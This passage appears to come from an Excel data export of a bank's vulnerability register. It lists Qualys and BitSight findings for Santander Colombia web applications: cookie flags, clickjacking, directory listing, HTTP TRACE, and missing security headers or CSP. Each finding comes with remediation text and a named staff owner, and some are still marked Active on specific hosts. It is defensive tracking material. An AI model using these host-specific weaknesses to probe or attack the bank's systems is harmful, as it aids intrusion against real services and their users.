    <s v="Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo &amp;quot;HTTPOnly&amp;quot; a las cookies."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="464"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="QA-WAS-a1f5fada-85bc-4c40-903c-9a761c1b8758"/>
    <m/>
    <x v="73"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://psepagos.santander.com.co/"/>
    <m/>
    <m/>
    <d v="2025-07-19T00:00:00"/>
    <n v="339"/>
    <d v="2025-10-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo &amp;quot;HTTPOnly&amp;quot;."/>
    <s v="Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo &amp;quot;HTTPOnly&amp;quot; a las cookies."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="465"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="QA-WAS-bdcc34ad-8343-4ef3-96e4-99980eb3ec73"/>
    <m/>
    <x v="73"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://psepagos.santander.com.co/"/>
    <m/>
    <m/>
    <d v="2025-07-19T00:00:00"/>
    <n v="339"/>
    <d v="2025-10-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo &amp;quot;HTTPOnly&amp;quot;."/>
    <s v="Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo &amp;quot;HTTPOnly&amp;quot; a las cookies."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="466"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="QA-WAS-e188397f-6703-4181-b7c7-e0de6f9f5611"/>
    <m/>
    <x v="73"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://psepagos.santander.com.co/"/>
    <m/>
    <m/>
    <d v="2025-07-19T00:00:00"/>
    <n v="339"/>
    <d v="2025-10-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo &amp;quot;HTTPOnly&amp;quot;."/>
    <s v="Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo &amp;quot;HTTPOnly&amp;quot; a las cookies."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="467"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="QA-WAS-09684b94-37e5-43da-a186-9d8a9e072355"/>
    <m/>
    <x v="74"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://psepagos.santander.com.co/"/>
    <m/>
    <m/>
    <d v="2025-07-19T00:00:00"/>
    <n v="339"/>
    <d v="2025-10-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo &amp;quot;seguro&amp;quot;."/>
    <s v="Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo &amp;quot;seguro&amp;quot; a las cookies y obligue a que todas las solicitudes confidenciales se envíen a través de HTTPS."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="468"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="QA-WAS-1398d935-e923-4c5d-9cb2-c08bfa972734"/>
    <m/>
    <x v="74"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://psepagos.santander.com.co/"/>
    <m/>
    <m/>
    <d v="2025-07-19T00:00:00"/>
    <n v="339"/>
    <d v="2025-10-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo &amp;quot;seguro&amp;quot;."/>
    <s v="Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo &amp;quot;seguro&amp;quot; a las cookies y obligue a que todas las solicitudes confidenciales se envíen a través de HTTPS."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="469"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="QA-WAS-66d469c6-b13b-4246-9895-2eacd6356044"/>
    <m/>
    <x v="74"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://psepagos.santander.com.co/"/>
    <m/>
    <m/>
    <d v="2025-07-19T00:00:00"/>
    <n v="339"/>
    <d v="2025-10-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo &amp;quot;seguro&amp;quot;."/>
    <s v="Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo &amp;quot;seguro&amp;quot; a las cookies y obligue a que todas las solicitudes confidenciales se envíen a través de HTTPS."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="470"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="QA-WAS-a720e367-ea4c-4e7d-9924-b6e4a82a0ae6"/>
    <m/>
    <x v="74"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://psepagos.santander.com.co/"/>
    <m/>
    <m/>
    <d v="2025-07-19T00:00:00"/>
    <n v="339"/>
    <d v="2025-10-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo &amp;quot;seguro&amp;quot;."/>
    <s v="Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo &amp;quot;seguro&amp;quot; a las cookies y obligue a que todas las solicitudes confidenciales se envíen a través de HTTPS."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="471"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="QA-WAS-bb7f57a9-d0df-4a33-9cd8-cbc5b70fd987"/>
    <m/>
    <x v="74"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://psepagos.santander.com.co/"/>
    <m/>
    <m/>
    <d v="2025-07-19T00:00:00"/>
    <n v="339"/>
    <d v="2025-10-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo &amp;quot;seguro&amp;quot;."/>
    <s v="Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo &amp;quot;seguro&amp;quot; a las cookies y obligue a que todas las solicitudes confidenciales se envíen a través de HTTPS."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="472"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="QA-WAS-d5ea8a6a-d9df-44f6-9552-94f71172d67d"/>
    <m/>
    <x v="74"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://psepagos.santander.com.co/"/>
    <m/>
    <m/>
    <d v="2025-07-19T00:00:00"/>
    <n v="339"/>
    <d v="2025-10-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo &amp;quot;seguro&amp;quot;."/>
    <s v="Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo &amp;quot;seguro&amp;quot; a las cookies y obligue a que todas las solicitudes confidenciales se envíen a través de HTTPS."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="473"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="QA-WAS-dcbfb343-e73c-480a-9c02-09641960c057"/>
    <m/>
    <x v="74"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://psepagos.santander.com.co/"/>
    <m/>
    <m/>
    <d v="2025-07-19T00:00:00"/>
    <n v="339"/>
    <d v="2025-10-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo &amp;quot;seguro&amp;quot;."/>
    <s v="Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo &amp;quot;seguro&amp;quot; a las cookies y obligue a que todas las solicitudes confidenciales se envíen a través de HTTPS."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="474"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="QA-WAS-f590c091-8752-4144-9d03-35f6a789e2d7"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.2"/>
    <m/>
    <m/>
    <s v="https://psepagos.santander.com.co/"/>
    <m/>
    <m/>
    <d v="2025-07-19T00:00:00"/>
    <n v="339"/>
    <d v="2025-10-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La página web se puede enmarcar. Esto significa que los ataques de clickjacking contra los usuarios son posibles."/>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s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="475"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="QA-WAS-a00b7f54-d1bc-4017-a701-ee709736b748"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4.7"/>
    <m/>
    <m/>
    <s v="https://psepagos.santander.com.co/icons/small/"/>
    <m/>
    <m/>
    <d v="2025-07-19T00:00:00"/>
    <n v="339"/>
    <d v="2025-10-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor web presenta una lista de directorios"/>
    <s v="The presence of a browseable directory does not necessarily imply a vulnerability. Determine if the directory listing is intended to be displayed. Verify that no files in the directory contain content that should not be served by the Web application."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="476"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="QA-VM--6577122839519728492"/>
    <m/>
    <x v="123"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.8"/>
    <m/>
    <m/>
    <s v="psepagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-19T00:00:00"/>
    <n v="339"/>
    <d v="2025-10-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado un servidor web que admite el método HTTP TRACE. Este método permite la depuración y el análisis de seguimiento de conexiones para las conexiones del cliente al servidor web. Según la especificación HTTP, cuando se utiliza este método, el servidor web devuelve la información que le envía el cliente sin modificar ni filtrar. El servidor web de Microsoft IIS usa un alias TRACK para este método y es funcionalmente el mismo. Se descubrió una vulnerabilidad relacionada con este método. Un componente activo y malintencionado de una página web puede enviar solicitudes de seguimiento a un servidor web que admita este método de seguimiento. Por lo general, la seguridad del navegador no permite el acceso a sitios web fuera del dominio del sitio actual. Aunque es poco probable y difícil de lograr, es posible, en presencia de otras vulnerabilidades del navegador, que el contenido HTML activo realice solicitudes externas a servidores web arbitrarios más allá del servidor web de alojamiento. Dado que el servidor web elegido devuelve la solicitud del cliente sin filtrar, la respuesta también incluye credenciales de autenticación basadas en cookies o en web (si ha iniciado sesión) que el explorador envía automáticamente a la aplicación web especificada en el servidor web especificado. La importancia de la capacidad de seguimiento en esta vulnerabilidad es que el componente activo de la página visitada por el usuario víctima no tiene acceso directo a esta información de autenticación, pero la obtiene después de que el servidor web de destino la devuelva como su respuesta de seguimiento. Dado que esta vulnerabilidad existe como soporte para un método requerido por la especificación del protocolo HTTP, los servidores web más comunes son vulnerables. Los métodos exactos admitidos, Trace y/o Track, y sus respuestas se encuentran en la sección Resultados a continuación. Se requiere que el seguimiento / rastreo esté deshabilitado para cumplir con PCI."/>
    <s v="A continuación se proporcionan soluciones para algunos de los servidores web más comunes. Para otros servidores web, consulte la documentación de su proveedor. Apache: Las versiones recientes de Apache tienen un módulo Rewrite que permite que las solicitudes HTTP se reescriban o manejen de una manera específica. Compile el servidor Apache con el módulo mod_rewrite. Es posible que deba quitar la marca de comentario de las directivas 'AddModule' y 'LoadModule' en el archivo de configuración httpd.conf. Agregue las siguientes líneas para cada virtualhost en su archivo de configuración (tenga en cuenta que, de forma predeterminada, las configuraciones de reescritura no se heredan. Esto significa que debe tener directivas de reescritura para cada host virtual en el que desee usarlo): &lt;IfModule mod_rewrite.c&gt; RewriteEngine activado RewriteCond %{REQUEST_METHOD} ^TRACE RewriteRule .* - [F] &lt;/IfModule&gt; Con esta configuración, Apache detecta todas las solicitudes TRACE y responde con una página que informa de la solicitud como prohibida. No se devuelve nada del contenido de la solicitud original. Una solución un poco más ajustada es usar: &lt;IfModule mod_rewrite.c&gt; RewriteEngine activado RewriteCond %{REQUEST_METHOD} !^(GET|CORREO|CABEZA)$ RewriteRule .* - [F] &lt;/IfModule&gt; Tenga en cuenta que RewriteEngine puede hacer un uso intensivo del procesador y puede afectar al rendimiento del servidor web. El método de seguimiento también se puede controlar mediante el uso de la directiva TraceEnable. En el archivo httpd.conf agregue o modifique: TraceEnable Desactivado Microsoft IIS: Microsoft lanzó URLScan, que se puede usar para filtrar todas las solicitudes entrantes en función de conjuntos de reglas personalizados. URLScan se puede utilizar para desinfectar o deshabilitar las solicitudes TRACE de los clientes. Tenga en cuenta que IIS asigna el alias 'TRACK' a 'TRACE'. Por lo tanto, si URLScan se utiliza para bloquear específicamente el método TRACE, el método TRACK también debe agregarse al filtro. URLScan utiliza el archivo de configuración 'urlscan.ini', normalmente en el directorio \System32\InetSrv\URLScan. En eso, tenemos dos secciones: AllowVerbs y DenyVerbs. El primero se usa si la variable UseAllowVerbs se establece en 1, de lo contrario (si se establece en 0), se usan DenyVerbs. Claramente, se puede usar cualquiera de los dos, dependiendo de si queremos una política Default-Deny-Explicit-Allow o una política Default-Allow-Explicit-Deny. Para no permitir los métodos TRACE y TRACK a través de URLScan, primero elimine los métodos 'TRACK' y 'TRACE' de la sección 'AllowVerbs' y agréguelos a la sección 'DenyVerbs'. Con esto, URLScan no permitirá todos los métodos 'TRACE' y 'TRACK', y generará una página de error para todas las solicitudes que utilicen ese método. Para habilitar los cambios, reinicie el 'Servicio de publicación de la World Wide Web' desde el elemento del Panel de control 'Servicios'. Para más detalles sobre otros servidores web : Cert Advisory."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="477"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="QA-VM-7172697214895775080"/>
    <m/>
    <x v="198"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.8"/>
    <m/>
    <m/>
    <s v="psepagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-19T00:00:00"/>
    <n v="339"/>
    <d v="2025-10-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor web remoto admite los métodos HTTP TRACE y/o TRACK, lo que facilita a los atacantes remotos el robo de cookies y credenciales de autenticación o la elusión del mecanismo de protección HttpOnly. Se requiere que el seguimiento / rastreo esté deshabilitado para cumplir con PCI."/>
    <s v="Deshabilite estos métodos en el archivo de configuración de su servidor web."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="478"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="QA-VM-8445736844288340302"/>
    <m/>
    <x v="199"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5"/>
    <m/>
    <m/>
    <s v="psepagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-19T00:00:00"/>
    <n v="339"/>
    <d v="2025-10-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor web tiene algunos directorios listables. Se puede obtener información muy confidencial de los listados de directorios."/>
    <s v="Deshabilite la exploración de directorios o la lista para todos los directorios."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="479"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="QA-VM-6710104514884330748"/>
    <m/>
    <x v="165"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4.7"/>
    <m/>
    <m/>
    <s v="psepagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-19T00:00:00"/>
    <n v="339"/>
    <d v="2025-10-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Este QID informa de la ausencia de los siguientes encabezados HTTP según CWE-693: Error del mecanismo de protección: X-Frame-Options: Este encabezado de respuesta HTTP mejora la protección de las aplicaciones web contra ataques de clickjacking. El secuestro de clics, también conocido como &quot;ataque de reparación de la interfaz de usuario&quot;, permite a un atacante utilizar varias capas transparentes u opacas para engañar a un usuario objetivo para que haga clic en un botón o enlace de otra página cuando tenía la intención de hacer clic en la página de nivel superior. X-XSS-Protection: Este encabezado HTTP habilita el filtro Cross-Site Scripting (XSS) integrado en el navegador para evitar ataques de secuencias de comandos entre sitios. X-XSS-Protección: 0; Deshabilita esta funcionalidad. X-Content-Type-Options: Este encabezado HTTP evita ataques basados en la discordancia de tipo MIME. El único valor posible es nosniff. Si su servidor devuelve X-Content-Type-Options: nosniff en la respuesta, el navegador se negará a cargar los estilos y scripts en caso de que tengan un tipo MIME incorrecto. Strict-Transport-Security: El encabezado de respuesta HTTP Strict-Transport-Security (HSTS) es una característica de seguridad que permite a un sitio web indicar a los navegadores que solo se debe comunicar con él mediante HTTPS, en lugar de usar HTTP. Lógica de detección de QID: Este QID no autenticado busca la presencia de las siguientes respuestas HTTP: Las directivas válidas para X-Frame-Options son: X-Frame-Options: DENY - La página no se puede mostrar en un marco, independientemente del sitio que intente hacerlo. X-Frame-Options: SAMEORIGIN: la página solo se puede mostrar en un marco en el mismo origen que la página en sí. X-Frame-Options: ALLOW-FROM RESOURCE-URL: la página solo se puede mostrar en un marco en el origen especificado. Las directivas válidas para X-XSS-Protections son: X-XSS-Protection: 1 - Habilita el filtrado XSS (generalmente predeterminado en los navegadores). Si se detecta un ataque de secuencias de comandos entre sitios, el navegador desinfectará la página (eliminará las partes inseguras). X-XSS-Protección: 1; mode=block - Habilita el filtrado XSS. En lugar de desinfectar la página, el navegador evitará la representación de la página si se detecta un ataque. X-XSS-Protección: 1; report=URI - Habilita el filtrado XSS. Si se detecta un ataque de secuencias de comandos entre sitios, el navegador desinfectará la página e informará de la infracción. Esto usa la funcionalidad de la directiva report-uri de CSP para enviar un informe. X-XSS-Protection: 0 deshabilita esta directiva y, por lo tanto, también se trata como no detectado. Una directiva válida para X-Content-Type-Options: nosniff Una directiva HSTS válida Strict-Transport-Security: max-age=&lt;expire-time&gt;; [; incluirSubDominios][; precarga] NOTA: Todas las directivas de solo informe (cuando corresponda) se consideran inválidas."/>
    <s v="Nota: Para depurar mejor los resultados de este QID, se solicita que los clientes ejecuten comandos para simular la siguiente funcionalidad: curl -lkL --verbose. CWE-693: Falla del mecanismo de protección menciona lo siguiente: el producto no utiliza o utiliza incorrectamente un mecanismo de protección que proporciona suficiente defensa contra ataques dirigidos contra el producto. Un mecanismo de protección &quot;faltante&quot; se produce cuando la aplicación no define ningún mecanismo contra una determinada clase de ataque. Un mecanismo de protección &quot;insuficiente&quot; puede proporcionar algunas defensas, por ejemplo, contra los ataques más comunes, pero no protege contra todo lo que se pretende. Por último, un mecanismo &quot;ignorado&quot; se produce cuando un mecanismo está disponible y en uso activo dentro del producto, pero el desarrollador no lo ha aplicado en alguna ruta de código. Se recomienda a los clientes que establezcan los encabezados de respuesta HTTP X-Frame-Options, X-XSS-Protection, X-Content-Type-Options y Strict-Transport-Security. Dependiendo de su software de servidor, los clientes pueden establecer directivas en la configuración de su sitio o en los archivos Web.config. Algunos ejemplos son: Opciones de marco X: Apache: Encabezado siempre anexa X-Frame-Options SAMEORIGIN nginx: add_header X-Frame-Options SAMEORIGIN; HAProxy: rspadd X-Frame-Options:\ SAMEORIGIN IIS: &lt;HTTPPROTOCOL&gt;&lt;CUSTOMHEADERS&gt;&lt;ADD NAME=&quot;X-Frame-Options&quot; VALUE=&quot;SAMEORIGIN&quot;&gt;&lt;/ADD&gt;&lt;/CUSTOMHEADERS&gt;&lt;/HTTPPROTOCOL&gt; X-XSS-Protección: Apache: Encabezado siempre establecido X-XSS-Protection &quot;1; modo=bloque&quot; PHP: header(&quot;X-XSS-Protection: 1; modo=bloque&quot;); X-content-type-options: Apache: Header always set X-Content-Type-Options: nosniff HTTP Strict-Transport-Security: Apache: Encabezado siempre establecido Strict-Transport-Security &quot;max-age=31536000; includeSubDomains&quot; Nginx: add_header Estricta Seguridad de Transporte max-age=31536000; Nota: Los dispositivos de red que incluyen una consola HTTP/HTTPS con fines administrativos o de gestión a menudo no incluyen todos o algunos de los encabezados de seguridad. Este es un problema conocido y se recomienda ponerse en contacto con el proveedor para obtener una solución."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="480"/>
    <s v="BSNC"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <m/>
    <x v="200"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <s v="teal.cdt.santander.com.co:80"/>
    <m/>
    <m/>
    <d v="2025-08-18T00:00:00"/>
    <n v="309"/>
    <d v="2025-12-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Esta Content-Security-Policy (CSP) tiene problemas que posiblemente la hacen insegura._x000a__x000a_La implementación de estos encabezados no sigue las mejores prácticas de seguridad._x000a__x000a_Content-Security-Policy:_x000a__x000a_reporting-objective: No se utiliza ninguna directiva de información_x000a_form-action-objective: Limitación del privilegio de solicitud (Formulario-Acciones)_x000a_code-injection-objective: Prevención limitada de la inyección de código_x000a_default-src: Falta default-src"/>
    <s v="Elimine cualquier instancia de directivas &quot;unsafe-&quot; y fuentes &quot;blob, data, filesystem&quot;. Asegúrese de que sus directivas CSP están correctamente configuradas._x000a__x000a_Asegúrese de que sus cabeceras se implementan correctamente, como se indica en RFC-7231. Sus cabeceras no deben permitir el almacenamiento en caché de contenido cifrado. También deben tener permisos específicos (en lugar de utilizar comodines u otras generalizaciones) y estar formateados correctamente._x000a__x000a_reporting-objective: Incluir una directiva de notificación con una ubicación o grupo válidos._x000a_form-action-objective: Incluya la directiva form-actions en su CSP._x000a_code-injection-objective: No utilice ninguna palabra clave &quot;insegura&quot; y utilice hosts explícitos para cualquier directiva de la lista de fuentes._x000a_default-src: Utilice la directiva default-src en su Content-Security-Policy (CSP), tal y como se especifica en W3C CSP._x000a__x000a_https://www.w3.org/TR/CSP/_x000a__x000a_https://datatracker.ietf.org/doc/html/rfc7231"/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="481"/>
    <s v="BSNC"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <m/>
    <x v="200"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <s v="teal.cdt.santander.com.co:443"/>
    <m/>
    <m/>
    <d v="2025-08-18T00:00:00"/>
    <n v="309"/>
    <d v="2025-12-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Esta Content-Security-Policy (CSP) tiene problemas que posiblemente la hacen insegura._x000a__x000a_La implementación de estos encabezados no sigue las mejores prácticas de seguridad._x000a__x000a_Content-Security-Policy:_x000a__x000a_reporting-objective: No se utiliza ninguna directiva de información_x000a_form-action-objective: Limitación del privilegio de solicitud (Formulario-Acciones)_x000a_code-injection-objective: Prevención limitada de la inyección de código_x000a_default-src: Falta default-src"/>
    <s v="Elimine cualquier instancia de directivas &quot;unsafe-&quot; y fuentes &quot;blob, data, filesystem&quot;. Asegúrese de que sus directivas CSP están correctamente configuradas._x000a__x000a_Asegúrese de que sus cabeceras se implementan correctamente, como se indica en RFC-7231. Sus cabeceras no deben permitir el almacenamiento en caché de contenido cifrado. También deben tener permisos específicos (en lugar de utilizar comodines u otras generalizaciones) y estar formateados correctamente._x000a__x000a_reporting-objective: Incluir una directiva de notificación con una ubicación o grupo válidos._x000a_form-action-objective: Incluya la directiva form-actions en su CSP._x000a_code-injection-objective: No utilice ninguna palabra clave &quot;insegura&quot; y utilice hosts explícitos para cualquier directiva de la lista de fuentes._x000a_default-src: Utilice la directiva default-src en su Content-Security-Policy (CSP), tal y como se especifica en W3C CSP._x000a__x000a_https://www.w3.org/TR/CSP/_x000a__x000a_https://datatracker.ietf.org/doc/html/rfc7231"/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="482"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-5983fd1e-c49e-4858-98fb-198eb1232a27"/>
    <m/>
    <x v="123"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="portalpagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-08-16T00:00:00"/>
    <n v="311"/>
    <d v="2025-11-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="A potentially sensitive file, directory, or directory listing was discovered on the Web server."/>
    <s v="Verify that access to this file or directory is permitted. If necessary, remove it or apply access controls to it."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="483"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-df902567-eaf8-4260-971b-eec61be1529f"/>
    <m/>
    <x v="73"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="4.3"/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-08-16T00:00:00"/>
    <n v="311"/>
    <d v="2025-11-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="The cookie does not contain the &amp;quot;HTTPOnly&amp;quot; attribute."/>
    <s v="If the associated risk of a compromised account is high, apply the &amp;quot;HTTPOnly&amp;quot; attribute to cookies."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="484"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-256ea963-ea03-4ed3-9b2a-e6ad7c4efa92"/>
    <m/>
    <x v="74"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="4.3"/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-08-16T00:00:00"/>
    <n v="311"/>
